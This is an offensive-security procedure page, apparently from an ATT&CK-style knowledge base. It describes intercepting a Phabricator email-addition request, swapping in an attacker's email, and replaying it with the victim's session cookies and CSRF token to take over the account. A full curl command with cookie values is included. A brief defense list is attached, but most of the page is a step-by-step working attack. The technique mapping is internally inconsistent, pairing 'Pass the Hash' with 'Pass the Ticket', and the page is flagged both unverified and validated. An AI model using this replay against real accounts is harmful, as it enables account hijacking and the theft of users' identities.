---
id: modify-replay-uuid
name: Modify-and-Replay-Email-Addition-Request
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.832Z'
tactics:
  - '[[Persistence]]'
techniques:
  - '[[Use Alternate Authentication Material]]'
  - '[[Valid Accounts]]'
sub_techniques:
  - '[[Pass the Hash]]'
tags:
  - request-replay
  - email-injection
  - phabricator
commands:
  - '[[commands/phabricator-add-email-post]]'
platforms:
  - Web
tools:
  - '[[tools/SandroProxy]]'
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Use Alternate Authentication Material]]'
  - '[[Valid Accounts]]'
---

# Modify-and-Replay-Email-Addition-Request

## Summary

This procedure modifies the intercepted email addition request to inject the attacker's email address and replays it using the victim's session tokens, exploiting weak validation for unauthorized addition.

## Description

Phabricator's server relies on CSRF tokens and session cookies without additional ownership checks, allowing replayed requests to succeed. Modify the `email` parameter while preserving other elements. This leads to account takeover. Target: Phabricator email endpoint. Prerequisites: Intercepted request available.

## Requirements

1. Captured POST request from previous step
2. Attacker's email address (e.g., asuuu17@gmail.com)
3. Proxy tool for editing and resending

## Defense

Defensive measures and detection strategies:

- Require email verification before addition (e.g., OTP to new email)
- Implement session binding to IP or device fingerprints
- Audit logs for duplicate requests with modified payloads

## Objectives

1. Inject attacker's email into victim's account
2. Bypass authentication checks
3. Enable subsequent password reset

## Instructions

### Step 1: Edit Request

**Context**: Change the email parameter.

In the proxy, locate the POST body and replace `email=placeholder` with `email=asuuu17%40gmail.com`.

> Preserve `csrf`, `Cookie`, etc. Expected output: Modified request ready.

### Step 2: Replay Request

**Context**: Send the altered request.

Use the proxy's replay function or execute [[commands/phabricator-add-email-post]] with updated parameters:

Execute [[commands/phabricator-add-email-post]] to replay:

```bash
curl -X POST 'https://admin.phacility.com/settings/user/(username)/page/email/' \
  -H 'X-Phabricator-Csrf: B [@5xu5frjn4f5238616917563d]' \
  -H 'Cookie: aura=u2FOcME6PSlT; admin_phusr=amer17; admin_phsid=ld7bdwzjadvg5x3go3wykgzj3blk3qrdidlqd452; halo=9LIv4U24kVpa' \
  -d 'csrf=B%402hmxctpgc672d004d5b2cc5c&form=1&dialog=1&new=true&email=asuuu17%40gmail.com&submit=true&wflow=true&ajax=true&metablock=3'
```

> Expected output: 200 OK or redirect, email added.

### Step 3: Verify Addition

**Context**: Check account settings.

Refresh the email page.

> Expected output: Attacker's email listed.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]] Persistence

### Techniques

- [[Use Alternate Authentication Material]] Use Alternate Authentication Material
- [[Valid Accounts]] Valid Accounts

### Sub-Techniques

- [[Pass the Hash]] Pass the Ticket (adapted for session replay)

## Commands Used

- [[commands/phabricator-add-email-post]]

## Tools Used

- [[tools/SandroProxy]]

## Tags

- [[request-replay]]
- [[email-injection]]
- [[phabricator]]
